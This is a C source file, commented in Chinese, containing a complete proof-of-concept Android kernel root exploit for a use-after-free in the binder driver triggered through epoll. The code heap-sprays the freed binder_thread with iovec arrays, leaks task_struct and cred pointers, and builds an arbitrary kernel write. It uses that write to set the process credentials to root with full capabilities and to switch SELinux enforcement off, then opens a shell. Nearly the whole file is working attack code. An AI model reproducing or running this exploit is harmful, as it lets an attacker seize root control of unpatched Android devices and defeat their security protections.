#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <pthread.h>


#define ONE_PAGE_SIZE           0x1000
#define KERNEL_ADDR_START       0xffff000000000000

typedef unsigned int u32;

#define BINDER_THREAD_EXIT      0x40046208ul
#define BINDER_SET_MAX_THREADS  0x40046205ul

#define RETRIES                 10
#define DELAY_USEC              500000
#define MMAP_ADDR               0x100000000UL
#define MMAP_SIZE               (ONE_PAGE_SIZE*2)

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

enum{
	DEVINFO_OFFSET_NO,
	DEVINFO_OFFSET_OK,
};

struct devinfo{
	int flag;
	char* devname; 	               // 设备名称 /system/build.prog/ ro.product.model
	char* kernver;                 // 内存版本 /proc/version, uname -r
	int binder_thread_size; 	   // binder_thread 结构体大小
	int offset_binder_task; 	   // offsetof(binder_thread.task)
	int offset_binder_next; 	   // offsetof(binder_thread.wait.task_list.next)
	int offset_binder_wait; 	   // offsetof(binder_thread.wait)
	int offset_binder_next_task;   // binder_thread 结构体中next和task字段之间的偏移
	int offset_task_stack;		   // offsetof(task_struct.stack)
	int offset_task_cred;		   // offsetof(task_struct.cred)
	int offset_task_sched_class;   // offsetof(task_struct.sched_class)
	int offset_addr_limit;		   // offsetof(thread_info.addr_limit)
	int offset_selinux; 		   // 全局变量fair_sched_class与selinux_enforcing之间的偏移
	int kern_copy_offset;          // 泄漏的内核地址与拷贝地址之间的偏移
	int kern_copy_size;	           // 总共需要拷贝数据的大小
};

/* 利用安卓模拟器测试 */
struct devinfo devinfo[] = {
	{
		.flag = DEVINFO_OFFSET_OK,
		.devname = "Linux localhost",
		.kernver = "4.4.124+",
		.binder_thread_size = 0x198,
		.offset_binder_task = 0x190,
		.offset_binder_next = 0xa8,
		.offset_binder_wait = 0xa0,
		.offset_binder_next_task = 0xe8,
		.offset_task_stack = 0x8,
		.offset_task_cred = 0x940,
		.offset_task_sched_class = 0x58,
		.offset_addr_limit = 0x18,
		.offset_selinux = 0x75ef90,
		.kern_copy_offset = 0,
		.kern_copy_size = 4*0x100000,//4MB
	},
};

struct devinfo *dev_info;
void *mmap_addr;

/* 利用漏洞可泄露的内核数据 */
struct leak_data{
	unsigned long task;    // 存放泄露的task_struct指针
	unsigned long thread;  // 存放泄露的thread_info指针
	unsigned long cred;    // 存放泄露的cred指针
	unsigned long kaddr;   // 存放泄露的内核全局变量fair_sched_class的地址
};

/* 利用漏洞向任意地址写任意数据时使用信息 */
struct clobber_gdata{
	unsigned long dst;  // 要修改内存的地址
	void* src;          // 存放内容的地址
	int len;            // 修改内存的长度
};

typedef struct {
	int counter;
} atomic_t;

typedef struct kernel_cap_struct {
	u32 cap[2];
} kernel_cap_t;

struct cred {
	atomic_t    usage;
	uid_t       uid;        /* real UID of the task */
	gid_t       gid;        /* real GID of the task */
	uid_t       suid;       /* saved UID of the task */
	gid_t       sgid;       /* saved GID of the task */
	uid_t       euid;       /* effective UID of the task */
	gid_t       egid;       /* effective GID of the task */
	uid_t       fsuid;      /* UID for VFS ops */
	gid_t       fsgid;      /* GID for VFS ops */
	unsigned    securebits; /* SUID-less security management */
	kernel_cap_t    cap_inheritable; /* caps our children can inherit */
	kernel_cap_t    cap_permitted;  /* caps we're permitted */
	kernel_cap_t    cap_effective;  /* caps we can actually use */
	kernel_cap_t    cap_bset;   /* capability bounding set */
	kernel_cap_t    cap_ambient;    /* Ambient capability set */
	/* ... */
};

/*
 * 函数: iovec_size
 * 参数: iov, 指向 struct iovec 数组的指针; n, 数组项数
 * 返回: 计算的总长度
 * 说明: 计算iov指针指向的 struct iovec 数组中要读写的数据总长度
 */
unsigned long iovec_size(struct iovec *iov, int n)
{
	unsigned long sum = 0;
	for (int i = 0; i < n; i++)
		sum += iov[i].iov_len;
	return sum;
}

/*
 * 函数: clobber_group_data
 * 参数: gdata, 指向利用漏洞修改数据的信息; count, 共有多少组信息;
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞实现向任意地址写任意数据，可同时修改多组数据
 */
int clobber_group_data(int binder_fd, int epfd, struct clobber_gdata* gdata, int count)
{
	int i, j;
	int result;
	int socks[2];
	pid_t fork_ret;
	int total_len = 0;
	int write_len = 0;
	/* 该函数执行成功 test_dat = test_val */
    unsigned long test_dat = 0;
    unsigned long const test_val = 0xABCDDEADBEEF1234ul;
	struct epoll_event event = { .events = EPOLLIN };
	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组元素的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);

	if(!iovec_array){
		printf("[ERROR] %s %d : malloc iovec_array failed!\n", __FUNCTION__, __LINE__);
		goto err_group_iovec;
	}

#if 0 /* 注释说明，假设修改一组数据 */
	/* 构造的数组内容，在漏洞触发后会覆盖iovec数组中字段，对应关系如下 */
	unsigned long second_write_chunk[] = {
		1,                           // iovec_array[indx_wait].iov_len
		0xdeadbeef,                  // iovec_array[indx_wait + 1].iov_base
		(5+2)*8,                     // iovec_array[indx_wait + 1].iov_len
		gdata->dst,                  // iovec_array[indx_wait + 2].iov_base
		gdata->len,                  // iovec_array[indx_wait + 2].iov_len
		(unsigned long)&test_dat,    // iovec_array[indx_wait + 3].iov_base
		sizeof(test_dat),            // iovec_array[indx_wait + 3].iov_len
	};
#endif
	unsigned long *second_write_chunk = malloc((5+count*2)*sizeof(unsigned long));
	if(!second_write_chunk){
		printf("[ERROR] %s %d : malloc iovec_array failed!\n", __FUNCTION__, __LINE__);
		goto err_group_chunk;
	}
	second_write_chunk[0] = 1;
	second_write_chunk[1] = 0xdeadbeef;
	second_write_chunk[2] = (5+count*2)*sizeof(unsigned long);
	for(i = 3, j = 0; j < count; j++){
		second_write_chunk[i++] = gdata[j].dst;
		second_write_chunk[i++] = gdata[j].len;
	}
	second_write_chunk[i++] = (unsigned long)&test_dat;
	second_write_chunk[i] = sizeof(test_dat);

	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		printf("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!\n", __FUNCTION__, __LINE__);
		goto err_group_epoll;
	}

	memset(iovec_array, 0, iovec_array_size);
	/* 初始化 iovec_array 数组数据
	 * 第一组数据，填充触发漏洞时自旋锁操作后地址出现一个字节的情况
	 * 第二组数据，作用是触发漏洞后将second_write_chunk内容填充到iovec_array[indx_wait].iov_len对应的内核位置
	 * 第三-最后第二组数据，作用是写入指定内容到指定地址
	 * 最后一组数据，用于测试是否成功 */
	iovec_array[indx_wait].iov_base = mmap_addr;     /* wq->lock spinlock in the low address half must be zero */
	iovec_array[indx_wait].iov_len = 1;              /* wq->task_list->next */
	iovec_array[indx_wait + 1].iov_base = mmap_addr; /* wq->task_list->prev */
	iovec_array[indx_wait + 1].iov_len = (5+count*2)*sizeof(void*); /* 该值为second_write_chunk大小 */
	
	for(i = 2, j = 0; j < count; i++, j++){
		iovec_array[indx_wait + i].iov_base = mmap_addr;
		iovec_array[indx_wait + i].iov_len = gdata[j].len;
	}
	iovec_array[indx_wait + i].iov_base = mmap_addr;
	iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	total_len = iovec_size(iovec_array, iovec_array_count);
	write_len = total_len - 1;
	//printf(">>> total_len = 0x%x, write_len = 0x%x\n", total_len, write_len);

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks))
		printf("[ERROR] %s %d : socketpair SOCK_STREAM failed!\n", __FUNCTION__, __LINE__);
	/* 触发漏洞前先写入一个字节，绕过第一组数据，防止触发漏洞后iovec_array[indx_wait].iov_len
	 * 被改为内核地址，长度不确定 */
	if (write(socks[1], "X", 1) != 1)
		printf("[ERROR] %s %d : write socket dummy byte failed!\n", __FUNCTION__, __LINE__);

	/* 创建子进程 */
	fork_ret = fork();
	if (fork_ret == -1){
		printf("[ERROR] %s %d : fork child failed!\n", __FUNCTION__, __LINE__);
	}
	else if (fork_ret == 0){
		/* Child process */
		int pos = 0;
        char *write_buf = malloc(write_len);
		if(!write_buf)
			printf("[ERROR] %s %d : malloc write_buf failed!\n", __FUNCTION__, __LINE__);
		memset(write_buf, 0, write_len);

		prctl(PR_SET_PDEATHSIG, SIGKILL);
		/* 等待父进程阻塞后调度到子进程执行 */
		usleep(DELAY_USEC);
		/* 4、触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			printf("[ERROR] %s %d : epoll_ctl EPOLL_CTL_DEL failed!\n", __FUNCTION__, __LINE__);
		}
		/* 准备写入的数据 */
        memcpy(write_buf, second_write_chunk, (5+count*2)*sizeof(void*));
		pos += (5+count*2)*8;
		for(i = 0; i < count; i++){
        	memcpy(write_buf + pos, gdata[i].src, gdata[i].len);
			pos += gdata[i].len;
		}
        memcpy(write_buf + pos, &test_val, sizeof(test_val));
		/* 5、写入数据，必须保证写端和读端的数据长度一致 */
		if (write(socks[1], write_buf, write_len) != write_len)
			printf("[ERROR] %s %d : write second chunk to socket failed!\n", __FUNCTION__, __LINE__);

		free(write_buf);
		close(socks[0]);
		close(socks[1]);
		exit(0);
	}
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		printf("[ERROR] %s %d : ioctl binder_fd BINDER_THREAD_EXIT failed!\n", __FUNCTION__, __LINE__);
	}
	struct msghdr msg = {
		.msg_iov = iovec_array,
		.msg_iovlen = iovec_array_count
	};
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存，这里进行堆喷很容易成功，是因为slub的实现机制，
	 *    请仔细阅读slub相关代码，对理解堆喷有帮助
	 *    因为之前已经写入一个字节数据，所以这里会将第一组数据读取，之后阻塞住等待写入（这一点很重要）
	 *    这里没有使用管道是因为管道读完第一组数据后没办法阻塞
	 * 6、触发漏洞之后读端数据会发生变化
	 *    iovec_array[indx_wait].iov_base = mmap_addr;
	 *    iovec_array[indx_wait].iov_len = kp_next; //就是iovec_array[indx_wait].iov_len对应的内核地址
	 *    // 因为第一组数据已经读取，可以绕过，从第二组数据开始读取
	 *    iovec_array[indx_wait + 1].iov_base = kp_next;
	 *    iovec_array[indx_wait + 1].iov_len = (5+count*2)*sizeof(void*);
	 *    for(i = 2, j = 0; j < count; i++, j++){
	 *        iovec_array[indx_wait + i].iov_base = mmap_addr;
	 *        iovec_array[indx_wait + i].iov_len = gdata[j].len;
	 *    }
	 *    iovec_array[indx_wait + i].iov_base = mmap_addr;
	 *    iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	 *
	 *    读取第二组数据，将写入的second_write_chunk数据内容写到iovec_array[indx_wait].iov_len对应的内核地址
	 *    之后读端数据又发生了变化
	 *    for(i = 2, j = 0; j < count; i++, j++){
	 *        iovec_array[indx_wait + i].iov_base = gdata[j].dst;
	 *        iovec_array[indx_wait + i].iov_len = gdata[j].len;
	 *    }
	 *    iovec_array[indx_wait + i].iov_base = test_dat;
	 *    iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	 *    
	 *    读取第三-最后第二组数据，就会将写入的gdata[i].src数据（任意数值），读取到gdata[j].dst（任意地址），
	 *    达到了向任意内核地址写任意值
	 *
	 *    读取最后一组数据，将写入的test_val的值读取到test_dat中 */
	result = recvmsg(socks[0], &msg, MSG_WAITALL);
	if(result != total_len){
		printf("[ERROR] %s %d : recvmsg failed! result = 0x%x, total_len = 0x%x\n",  __FUNCTION__, __LINE__, result, total_len);
	}

	close(socks[0]);
	close(socks[1]);
err_group_epoll:
	free(second_write_chunk);
err_group_chunk:
	free(iovec_array);
err_group_iovec:
	return test_dat == test_val;
}

int clobber_group_data_retry(int binder_fd, int epfd, struct clobber_gdata* gdata, int count)
{
	int retry = 0;

	/* 失败后，重复尝试RETRIES次 */
	while (retry < RETRIES && !clobber_group_data(binder_fd, epfd, gdata, count)) {
		//printf(">>> clobber_group_data_retry [%d]\n", retry);
		retry++;
	}
	if(retry >= RETRIES){
		printf(">>> clobber_group_data_retry failed\n");
	}

	return retry < RETRIES;
}

/*
 * 函数: leak_task
 * 参数: dat, 存放泄露的内核数据
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞泄露task内容
 */
int leak_task(int binder_fd, int epfd, struct leak_data* dat)
{
	int ret = 0;	
	int status = 0;
	int pipefd[2];
	int leakpipe[2];
    int max_threads = 2;
	pid_t fork_ret;
	int offset = 0;
	struct epoll_event event = { .events = EPOLLIN };
	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);

	if(!iovec_array){
		printf("[ERROR] %s %d : malloc iovec_array failed!\n", __FUNCTION__, __LINE__);
		goto err_leak_iovec;
	}
	memset(iovec_array, 0, iovec_array_size);

	/* 设置binder最多可以请求注册线程个数 */
    if(ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads)){
		printf("[ERROR] %s %d : ioctl binder_fd BINDER_SET_MAX_THREADS failed!\n", __FUNCTION__, __LINE__);
	}
	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		printf("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!\n", __FUNCTION__, __LINE__);
	}

	/*
	 * 这里初始化四组数据
	 * 第一组数据，作用是阻塞管道;
	 * 第二组数据，作用是触发漏洞之后泄露内核数据;
	 * 第三组数据，作用是阻塞管道;
	 * 第四组数据，作用是在修改地址后，再次泄露内核数据
	 */
	iovec_array[indx_wait].iov_base = mmap_addr;     /* wq->lock spinlock in the low address half must be zero */
	iovec_array[indx_wait].iov_len = ONE_PAGE_SIZE;  /* wq->task_list->next */
	iovec_array[indx_wait + 1].iov_base = mmap_addr; /* wq->task_list->prev */
	iovec_array[indx_wait + 1].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait + 2].iov_base = mmap_addr;
	iovec_array[indx_wait + 2].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait + 3].iov_base = mmap_addr; /* 此地址后续会被修改为泄露内核数据的地址 */
	iovec_array[indx_wait + 3].iov_len = ONE_PAGE_SIZE;

	/* 计算需要修改第二次泄露内核信息的读取地址与next指针的偏移 */
	offset = (unsigned long)&(iovec_array[indx_wait + 3].iov_base) - (unsigned long)&(iovec_array[indx_wait].iov_len);
	//printf("    offset = 0x%x\n", offset);

	/* 此管道用来堆喷占位、泄露task内容 */
	if (pipe(pipefd))
		printf("[ERROR] %s %d : pipe fd failed!\n", __FUNCTION__, __LINE__);
	/* 此管道做父子进程通信，读取泄露的内容 */
    if (pipe(leakpipe))
        printf("[ERROR] %s %d : pipe leak fd failed!\n", __FUNCTION__, __LINE__);
	/* 设置管道大小为一个页 */
	if ((fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE)) != PAGE_SIZE)
		printf("[ERROR] %s %d : fcntl pipefd[0] size failed!\n", __FUNCTION__, __LINE__);
	if ((fcntl(pipefd[1], F_SETPIPE_SZ, PAGE_SIZE)) != PAGE_SIZE)
		printf("[ERROR] %s %d : fcntl pipefd[1] size failed!\n", __FUNCTION__, __LINE__);

	fork_ret = fork();
	if (fork_ret == -1){
		printf("[ERROR] %s %d : fork child failed!\n", __FUNCTION__, __LINE__);
	}
	else if (fork_ret == 0){
		/* Child process */
		unsigned long list_next = 0;
		unsigned long list_prev = 0;
		struct leak_data leak = {0,};
		char page_buffer[ONE_PAGE_SIZE];

		memset(page_buffer, 0, sizeof(page_buffer));

		if(prctl(PR_SET_PDEATHSIG, SIGKILL)){
			printf("[ERROR] %s %d : CHILD: prctl PR_SET_PDEATHSIG failed!\n", __FUNCTION__, __LINE__);
		}
		/* 等待父进程阻塞后调度 */
		usleep(DELAY_USEC);
		/* 4、第一次触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			printf("[ERROR] %s %d : CHILD: epoll_ctl EPOLL_CTL_DEL failed!\n", __FUNCTION__, __LINE__);
		}
		/* 5、读取第一组数据，数据内容是mmap_addr中第一页数据，无用数据
		 *    这里会将管道缓冲区读空，会唤醒父进程可以往管道写数据了 */
		if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)){
			printf("[ERROR] %s %d : CHILD: read pipefd[0] first page failed!\n", __FUNCTION__, __LINE__);
		}
		/* 7、读取第二组数据，由于管道被读空会被阻塞，等待父进程将第二组数据写入管道
		 *    当父进程写完第二组的一页数据后继续阻塞，子进程被唤醒继续读取第二组数据
		 *    数据的内容是iovec_array[indx_wait].iov_len对应的内核地址k_next往后的一页数据，
		 *    从而泄露内核数据，其中包括进程的task_struct指针 */
		if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)){
			printf("[ERROR] %s %d : CHILD: read pipefd[0] second page failed!\n", __FUNCTION__, __LINE__);
		}
		//hexdump_memory((unsigned char *)page_buffer, 0x100);//sizeof(page_buffer));

		/* 泄露的next和prev指针必须相等 */
		list_next = *(unsigned long *)(page_buffer);
		list_prev = *(unsigned long *)((unsigned char *)page_buffer + sizeof(void*));
		/* 从泄露的内核数据中获取task指针 */
		leak.task = *(unsigned long *)(page_buffer + dev_info->offset_binder_next_task);
		//printf(">>> CHILD: list_next = 0x%lx; list_prev = 0x%lx\n", list_next, list_prev);
		//printf(">>> CHILD: task_struct == 0x%lx\n", leak.task);

		/* 9、修改   iovec_array[indx_wait + 3].iov_base = task_struct
		 *    等待父进程写第四组数据时将task_struct内容写入管道中，之后子进程再读取管道数据
		 *    从而泄露task_struct内容 */
		if((leak.task > KERNEL_ADDR_START) && (list_next == list_prev) && (list_next > KERNEL_ADDR_START)){
			unsigned long extra[] = {
				/* 需要泄露的内核地址，这里是需要泄露的task地址 */
				leak.task,
				/* 需要泄露的数据的长度，这里固定一个页 */
				ONE_PAGE_SIZE
			};
			struct clobber_gdata gdata[] = {
				{
					/* 要修改的地址，这里就是iovec_array[indx_wait + 3].iov_base对应的内核地址 */
					.dst = list_next + offset,
					/* 写入数据的地址 */
					.src = (void*)&extra,
					/* 写入数据的长度 */
					.len = sizeof(extra),
				},
			};
			/* 调用任意写函数，成功修改返回1 */
			ret = clobber_group_data_retry(binder_fd, epfd, gdata, ARRAY_SIZE(gdata));
		}

		/* 10、读取第三组数据，无用数据，之后唤醒父进程继续写管道 */
		if (read(pipefd[0], page_buffer, ONE_PAGE_SIZE) != ONE_PAGE_SIZE){
			printf("[ERROR] %s %d : CHILD: read pipefd[0] third page failed!\n", __FUNCTION__, __LINE__);
		}
		/* 12、读取第四组数据，数据内容是task_struct */
		if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)){
			printf("[ERROR] %s %d : CHILD: read pipefd[0] thread_info failed!\n", __FUNCTION__, __LINE__);
		}
		//hexdump_memory((unsigned char *)page_buffer, ONE_PAGE_SIZE);
		/* 解析task_struct数据 */
		if(ret){
			/* 这里thread_info没有内嵌到task结构体，thread_info = stack */
			if(dev_info->offset_task_stack){
				leak.thread = *(unsigned long*)(page_buffer + dev_info->offset_task_stack);
			}
			/* 如果参数中指定cred偏移，则直接读取cred指针 */
			if(dev_info->offset_task_cred){
				leak.cred = *(unsigned long*)(page_buffer + dev_info->offset_task_cred);
			}
			/* 如果参数中指定sched_class偏移，则直接读取sched_class指针，
			 * 该指针指向全局变量fair_sched_class，后面根据它与selinux_enforcing之间的偏移
			 * 获取selinux_enforcing内核地址 */
			if(dev_info->offset_task_sched_class){
				leak.kaddr = *(unsigned long*)(page_buffer + dev_info->offset_task_sched_class);
			}
			//printf(">>> CHILD: thread_info == 0x%lx\n", leak.thread);
			//printf(">>> CHILD: cred = 0x%lx\n", leak.cred);
			//printf(">>> CHILD: kaddr = 0x%lx\n", leak.kaddr);
			status = 1;
		}
		else{
			status = 0;
		}

		/* 通过管道将泄露的数据传递给父进程 */
        if(write(leakpipe[1], &leak, sizeof(leak)) != sizeof(leak))
			printf("[ERROR] %s %d : CHILD: write leakpipe[1] failed!\n", __FUNCTION__, __LINE__);

		/* 通知父进程泄露信息状态 */
		if(write(leakpipe[1], &status, sizeof(status)) != sizeof(status))
			printf("[ERROR] %s %d : CHILD: write leakpipe[1] failed!\n", __FUNCTION__, __LINE__);

        close(pipefd[0]);
        close(pipefd[1]);
        close(leakpipe[0]);
        close(leakpipe[1]);
		exit(0);
	}
	/* Parent process */
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		printf("[ERROR] %s %d : PARENT: ioctl binder_fd BINDER_THREAD_EXIT failed!\n", __FUNCTION__, __LINE__);
	}
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存
	 *    写第一组数据，由于管道大小被修改为一个页面，所以会阻塞等待读取数据
	 *    总共四组数据，都是一个页大小，所以每写一组数据都会阻塞，等待读数据
	 * 6、子进程运行后触发漏洞，并读取第一组数据，此时管道为空可以继续往管道写数据
	 *    此时的iovec_array数据变化如下
	 *    iovec_array[indx_wait].iov_base = 0x100010001;
	 *    iovec_array[indx_wait].iov_len = k_next;//next指针对应的内核地址
	 *    // 第一组数据已经写入管道，所以没有影响
	 *    // 第二组数据的iov_base变成iovec_array[indx_wait].iov_len对应的内核地址k_next
	 *    // 此次写管道就会将k_next往后的一页数据写入管道，之后由于管道没有空间而阻塞，等待子进程读取数据
	 *    iovec_array[indx_wait + 1].iov_base = k_next;
	 *    iovec_array[indx_wait + 1].iov_len = 0x1000;
	 *    iovec_array[indx_wait + 2].iov_base = 0x100000000;
	 *    iovec_array[indx_wait + 2].iov_len = 0x1000;
	 *    iovec_array[indx_wait + 3].iov_base = 0x100000000;
	 *    iovec_array[indx_wait + 3].iov_len = 0x1000;
	 * 8、子进程读取第二组数据后，管道为空，唤醒父进程继续写第三组数据，之后再次阻塞等待子进程读取数据
	 * 11、子进程读取第三组数据之后将修改iovec_array[indx_wait + 3].iov_base = task_struct
	 *    此时的iovec_array数据变化如下，此时继续写管道会将task_struct内容写入管道
	 *    iovec_array[indx_wait + 3].iov_base = task_struct;
	 *    iovec_array[indx_wait + 3].iov_len = 0x1000; */
	ret = writev(pipefd[1], iovec_array, iovec_array_count);
	if(ret == -1)
		printf("[ERROR] %s %d : PARENT: writev failed!\n", __FUNCTION__, __LINE__);

	/* 从子进程读取泄露的内核信息 */
	ret = read(leakpipe[0], dat, sizeof(struct leak_data));
	if(ret == -1)
		printf("[ERROR] %s %d : PARENT: read leak data failed!\n", __FUNCTION__, __LINE__);

	/* 等待子进程退出 */
	if (wait(&status) != fork_ret)
		printf("[ERROR] %s %d : PARENT: wait child failed\n", __FUNCTION__, __LINE__);

	/* 读取子进程发送状态 */
    if(read(leakpipe[0], &status, sizeof(status)) != sizeof(status)){
		printf("[ERROR] %s %d : PARENT: read status failed\n", __FUNCTION__, __LINE__);
	}

	close(pipefd[0]);
	close(pipefd[1]);
	close(leakpipe[0]);
	close(leakpipe[1]);
	free(iovec_array);
err_leak_iovec:
	return status;
}


int leak_task_retry(int binder_fd, int epfd, struct leak_data* dat)
{
	int retry = 0;

	/* 失败后，重复尝试RETRIES次 */
	while (retry < RETRIES && !leak_task(binder_fd, epfd, dat)) {
		//printf(">>> leak_task retrying [%d]\n", retry);
		retry++;
	}
	
	if(retry >= RETRIES){
		printf(">>> leak_task failed\n");
	}

	return retry < RETRIES;
}

/*
 * 函数: patch_cred_selinux
 * 参数: selinux, selinux_enforcing的内核地址; cred, cred内核地址
 * 返回: 成功返回真，失败返回假
 * 说明: 修改 cred 和 selinux_enforcing 达到提权
 */
int patch_cred_selinux(int binder_fd, int epfd, unsigned long selinux, unsigned long cred)
{
	int ret = 0;
	unsigned int pselinux[] = {
		0,
	};
	struct cred pcred;
	pcred.usage.counter = 0x26;
	pcred.uid = 0;
	pcred.gid = 0;
	pcred.suid = 0;
	pcred.sgid = 0;
	pcred.euid = 0;
	pcred.egid = 0;
	pcred.fsuid = 0;
	pcred.fsgid = 0;
	pcred.securebits = 0;
	pcred.cap_inheritable.cap[0] = 0xffffffff;
	pcred.cap_inheritable.cap[1] = 0xffffffff;
	pcred.cap_permitted.cap[0] = 0xffffffff;
	pcred.cap_permitted.cap[1] = 0xffffffff;
	pcred.cap_effective.cap[0] = 0xffffffff;
	pcred.cap_effective.cap[1] = 0xffffffff;
	pcred.cap_bset.cap[0] = 0xffffffff;
	pcred.cap_bset.cap[1] = 0xffffffff;
	pcred.cap_ambient.cap[0] = 0xffffffff;
	pcred.cap_ambient.cap[1] = 0xffffffff;
	struct clobber_gdata gdata[] = {
		{
			.dst = selinux,
			.src = (void*)&pselinux,
			.len = sizeof(pselinux),
		},
		{
			.dst = cred,
			.src = (void*)&pcred,
			.len = sizeof(pcred),
		},
	};
	
	ret = clobber_group_data_retry(binder_fd, epfd, gdata, ARRAY_SIZE(gdata));

	return ret;
}

int init(void)
{
	dev_info = (struct devinfo*)&devinfo;

	return 0;
}


int main(void)
{
	int binder_fd, epfd;
	struct leak_data data;
	unsigned long selinux_enforcing = 0;
	int step = 0;

	printf("[%d] Starting POC\n", step++);

	init();

	mmap_addr = mmap((void*)MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (mmap_addr != (void*)MMAP_ADDR)
		printf("[ERROR] %s %d : mmap 4g aligned page failed!\n", __FUNCTION__, __LINE__);
	memset(mmap_addr, 0, MMAP_SIZE);

	binder_fd = open("/dev/binder", O_RDONLY);
	if(-1 == binder_fd){
		printf("[ERROR] %s %d : open /dev/binder failed!\n", __FUNCTION__, __LINE__);
		goto err;
	}

	epfd = epoll_create(1000);
	if(-1 == epfd){
		printf("[ERROR] %s %d : epoll_create failed!\n", __FUNCTION__, __LINE__);
		goto err;
	}

	/* 1、泄露task内容 */
	if(leak_task_retry(binder_fd, epfd, &data)){
		printf("[%d] Leak kernel data OK!\n", step++);
		printf("    task_struct = 0x%lx\n", data.task);
		printf("    thread_info = 0x%lx\n", data.thread);
		printf("    cred        = 0x%lx\n", data.cred);
		printf("    kaddr       = 0x%lx\n", data.kaddr);
	}
	else{
		printf("[%d] Leak kernel data failed!\n", step++);
		goto err;
	}

	/* 2、修改cred和selinux */
	if(!patch_cred_selinux(binder_fd, epfd, data.kaddr + dev_info->offset_selinux, data.cred)){
		printf("[%d] Patch cred and selinux failed!\n", step++);
		return -1;
	}
	printf("[%d] Patch cred and selinux OK!\n", step++);

err:
	munmap(mmap_addr, MMAP_SIZE);
	close(binder_fd);
	close(epfd);

	system("/system/bin/sh");

	//while(1);

	return 0;
}
